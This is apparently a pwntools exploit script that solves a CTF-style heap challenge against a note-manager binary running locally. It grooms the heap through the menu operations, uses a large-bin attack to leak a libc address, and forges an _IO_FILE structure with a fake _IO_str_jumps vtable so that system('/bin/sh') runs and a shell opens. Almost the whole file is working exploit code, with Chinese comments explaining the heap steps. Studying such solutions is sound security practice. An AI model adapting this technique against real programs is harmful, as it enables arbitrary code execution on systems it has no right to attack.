from pwn import *
context.arch='amd64'
from functools import wraps
from IO_FILE_plus import *
ELF_name = 'a.out'
context.log_level = "info"
context.terminal = ["tmux","splitw","-h"]
elf = context.binary = ELF(ELF_name)
#from io_file import fake_file
#write_got = elf.symbols['read']
import base64
libc = ELF( './libc.so.6')

gs = '''
b _start
b main
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REMOTE:
        return remote("127.0.0.1",10002)
    else:
        return process(elf.path)
def interactive():
    io.interactive()
io = start()
#load_libc = io.libc

csu_front_addr = 0x4005d0
csu_end_addr = 0x4005e6
'''
Welcome use the notes
1. add your note
2. del your note
3. edit the note
4. show the notes
5. show all tips
6. exit the note manager
'''

def show_message(func):
    @wraps(func)
    def run_func(*args,**kwargs):
        io.recvuntil("6. exit the note manager\n")
        return func(*args,**kwargs)
    return run_func
    #io.recvuntil("6. exit the note manager")
@show_message
def add_note(note_id,context):
    #send 1
    
    io.sendline("1")
    io.recvuntil("Please input the note id\n")
    io.sendline(note_id)
    io.recvuntil("Please input the notes brief introduction\n")
    io.sendline(context)
    #pass
@show_message
def del_note( note_id ):
    #send 2
    io.sendline("2")
    io.recvuntil("Please input the del note id")
    io.sendline(note_id)
    #io
    pass
@show_message
def modify_note(note_id,tip):
    #send 3
    io.sendline("3")
    io.recvline("Please input note id\n")
    io.sendline(note_id)
    io.recvline("Please input the context\n")
    io.sendline(tip)
    #pass
@show_message
def show_note(note_id):
    #send 4
    io.sendline("4")
    io.recvuntil("Please input the notes_id\n")
    io.sendline(note_id)
    pass
@show_message
def show_tips():
    #send 5
    io.sendline("5")
    data = io.recvuntil("Welcome")
    #data = str(data)
    #print(data)
    data = data[data.rfind(b'5')+2:-8]
    hex_data = u64(data+b'\x00\x00')
    #print(hex(hex_data))
    return hex_data
@show_message
def leak_address():
    io.sendline("7")
    data = io.recvuntil("ppp \n")[:-6]
    #data = io.recvline_startswith
    hex_data = data.decode('utf-8')
    #print(hex_data)
    #print(hex(int(hex_data,16)))
    data = io.recvuntil("nnn\n")
    #print(hex(int(hex_data,16)))
    return int(hex_data,16)
    pass
@show_message
def exit_note():
    #send 6
    io.sendline("6")
    pass

def csu(rbx,rbp,r12,r13,r14,r15,last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload =  p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(csu_front_addr)
    return payload


#0x428 1064
add_note("1","test1")
#0x418 1048
add_note("2","test2")
# 1064
modify_note("1 1064","tipstest1") #malloc(p1)
#1048
add_note("3","test3" )
add_note("4","notetest4")

modify_note("2 1048","tipstest2") #malloc(p2)
del_note("1")                     #free(p1)
#leak_address()
modify_note("3 1080","tip3")      #malloc(p3) 将p1放到large bin,这里会申请堆块
#0x438
del_note("2")                        #free(p2) 将p2放到 unsorted bin
add_note("5","test555")         #
note_data = show_tips() # add note5 结构体用到是del_note1 的，其中的tips 是放入到large bin的
#leak_address()
#print("note_data ",hex(note_data))
#print("libc_address ",hex(load_libc.address))
#print("sub",load_libc.address - note_data)#偏移是定值

#no_debug
#libc_address = note_data - 0x1befd0
#debug
libc_address = note_data - 0x398f48
bin_sh_address = libc_address + next(libc.search(b'/bin/sh'))
print("bin_sh_address",hex(bin_sh_address))
system_address = libc_address + libc.symbols["system"]

#_IO_str_jumps = libc_address + 0x395500 - 0x8
_IO_str_jumps = libc_address + libc.symbols['_IO_str_jumps'] - 0x8
_IO_str_overflow = libc_address + libc.symbols['_IO_str_jumps']
print("hex _IO_str_jumps",hex(libc.symbols['_IO_str_jumps']))

print("system_address",hex(system_address))
print("_IO_str_jumps",hex(_IO_str_jumps))
def get_str_finish_jmp():
    fake_file=IO_FILE_plus()
    fake_file._IO_write_ptr=1 # set _IO_write_ptr
    fake_file._IO_write_base=0
    #fake_file._write_ptr = 
    fake_file.vtable = _IO_str_jumps
    fake_file._IO_buf_base = bin_sh_address
    return (fake_file.get_payload().decode('unicode-escape')[16:])
pro_base = 0

def get_arbitrary_read():
    io_stdout_struct=IO_FILE_plus()
    flag=0
    flag&=~8
    flag|=0x800
    flag|=0x8000
    io_stdout_struct._flags=flag
    io_stdout_struct._IO_write_base=pro_base+elf.got['read']
    io_stdout_struct._IO_read_end=io_stdout_struct._IO_write_base
    io_stdout_struct._IO_write_ptr=pro_base+elf.got['read']+8
    io_stdout_struct._fileno=1
    io_stdout_struct.vtable = _IO_str_overflow
    #print(io_stdout_struct.arbitrary_read_check("stdout"))
    return io_stdout_struct.get_payload().decode('unicode-escape')[16:]
if args.GDB:
    print("libc_address  " + str(hex(libc_address)))
else:
    pass
    #print("libc_address  " + str(hex(libc_address)) +" std libc  "+ str(hex(load_libc.address)))
payload = p64(note_data-0x20)*4
# 0x1b9648 _chain的偏移
payload = p64(libc_address+0x398928-0x20)*4
#print(note_data)
#payload = 'BBBB'

modify_note("5 1080",payload) #修改 p1的值
#leak_address()
modify_note("4 1080","tipkkkkkkkk")  #malloc(p4) 修改任意值
fake_plus = "A"*50+'\x00'
#leak_address()
add_note("8","testdddd")

#get shell
modify_note("8 1080",get_str_finish_jmp()+(p64(system_address)+p64(system_address)).decode('unicode-escape'))
#modify_note("8 1080",get_arbitrary_read())


io.interactive()
